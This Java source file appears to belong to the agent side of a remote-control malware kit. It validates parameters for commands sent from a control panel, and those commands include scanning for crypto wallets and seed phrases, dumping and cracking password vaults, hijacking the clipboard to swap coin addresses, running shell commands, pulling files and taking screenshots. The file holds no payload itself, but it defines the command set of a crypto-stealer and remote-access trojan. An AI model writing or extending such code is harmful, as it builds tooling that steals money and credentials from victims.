package com.serverpackcore.agent;

import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * Agent-side mirror of contract/v1/task-schemas.json. The panel validates
 * before enqueueing and the agent validates again before touching disk, so a
 * malformed legacy command is an immediate, readable `error` instead of a
 * timeout.
 */
public final class TaskParams {
	private static final Set<String> UUID = Set.of("cancel");

	private TaskParams() {
	}

	/** Returns a human usage/validation message, or null when the params fit. */
	public static String validate(String name, Map<String, Object> params) {
		try {
			return switch (name) {
				case "scan_wallets" -> {
					String error = only(params, "include_desktop", "include_extensions", "include_seeds", "max_files", "max_bytes");
					if (error == null) error = bool(params, "include_desktop");
					if (error == null) error = bool(params, "include_extensions");
					if (error == null) error = bool(params, "include_seeds");
					if (error == null) {
						error = numbers(params, "max_files", 1, 20_000);
					}
					// The panel owns the max_bytes bound (1 MiB..512 MiB) so the
					// legacy path cannot drift from the contract.
					yield error != null ? error : integer(params, "max_bytes");
				}
				case "dump_vault" -> {
					String error = only(params, "target", "profile");
					if (error == null) {
						error = required(params, "target");
					}
					if (error == null) {
						error = text(params, "target", 1, 64);
					}
					yield error != null ? error : oneOf(params, "profile", "lite", "full");
				}
				case "crack_vault" -> {
					String error = only(params, "target", "max_seconds", "max_cpu_pct", "wordlist");
					if (error == null) {
						error = required(params, "target");
					}
					if (error == null) {
						error = numbers(params, "max_seconds", 5, 600);
					}
					if (error == null) {
						error = numbers(params, "max_cpu_pct", 10, 100);
					}
					yield error != null ? error : text(params, "wordlist", 0, 4096);
				}
				case "clip_start" -> {
					String error = only(params, "replace", "coins", "max_history");
					if (error == null) error = bool(params, "replace");
					if (error == null) error = object(params, "coins");
					yield error != null ? error : numbers(params, "max_history", 16, 5000);
				}
				case "clip_stop", "harvest", "screenshot" -> only(params);
				case "shell" -> {
					String error = only(params, "command", "timeout_sec");
					if (error == null) {
						error = required(params, "command");
					}
					if (error == null) {
						error = numbers(params, "timeout_sec", 1, 120);
					}
					yield error != null ? error : text(params, "command", 1, 8192);
				}
				case "file_pull" -> {
					String error = only(params, "path", "max_mb");
					if (error == null) {
						error = required(params, "path");
					}
					if (error == null) {
						error = numbers(params, "max_mb", 1, 256);
					}
					yield error != null ? error : text(params, "path", 1, 4096);
				}
				case "agent" -> {
					String error = only(params, "command");
					if (error == null) {
						error = required(params, "command");
					}
					yield error != null ? error : text(params, "command", 1, 512);
				}
				case "cancel" -> {
					String error = only(params, "task_id");
					yield error != null ? error : required(params, "task_id");
				}
				default -> "unknown_task: " + name;
			};
		} catch (Throwable throwable) {
			return "invalid_params: " + throwable.getMessage();
		}
	}

	private static String only(Map<String, Object> params, String... allowed) {
		List<String> keys = List.of(allowed);
		for (String key : params.keySet()) {
			if (!keys.contains(key)) {
				return "unknown_param: " + key;
			}
		}
		return null;
	}

	private static String required(Map<String, Object> params, String key) {
		Object value = params.get(key);
		return value == null || String.valueOf(value).isBlank() ? "missing_param: " + key : null;
	}

	private static String numbers(Map<String, Object> params, String key, int min, int max) {
		Object value = params.get(key);
		if (value == null) {
			return null;
		}
		if (!(value instanceof Number number)) {
			return "invalid_param: " + key;
		}
		long parsed = number.longValue();
		return parsed < min || parsed > max ? "invalid_param: " + key + " (" + min + ".." + max + ")" : null;
	}

	private static String integer(Map<String, Object> params, String key) {
		Object value = params.get(key);
		if (value == null) {
			return null;
		}
		return value instanceof Number ? null : "invalid_param: " + key;
	}

	private static String text(Map<String, Object> params, String key, int min, int max) {
		Object value = params.get(key);
		if (value == null) {
			return null;
		}
		if (!(value instanceof String text)) {
			return "invalid_param: " + key;
		}
		return text.length() < min || text.length() > max ? "invalid_param: " + key : null;
	}

	private static String bool(Map<String, Object> params, String key) {
		Object value = params.get(key);
		return value == null || value instanceof Boolean ? null : "invalid_param: " + key;
	}

	private static String object(Map<String, Object> params, String key) {
		Object value = params.get(key);
		return value == null || value instanceof Map ? null : "invalid_param: " + key;
	}

	private static String oneOf(Map<String, Object> params, String key, String... allowed) {
		Object value = params.get(key);
		if (value == null) {
			return null;
		}
		return value instanceof String text && List.of(allowed).contains(text) ? null : "invalid_param: " + key;
	}

	public static boolean uuid(String value) {
		return value != null && value.matches("(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
	}

	/** Task names the envelope may carry. */
	public static boolean known(String name) {
		return Set.of("scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
			"shell", "harvest", "screenshot", "file_pull", "cancel", "agent").contains(name);
	}

	static Set<String> cancellable() {
		return UUID;
	}
}
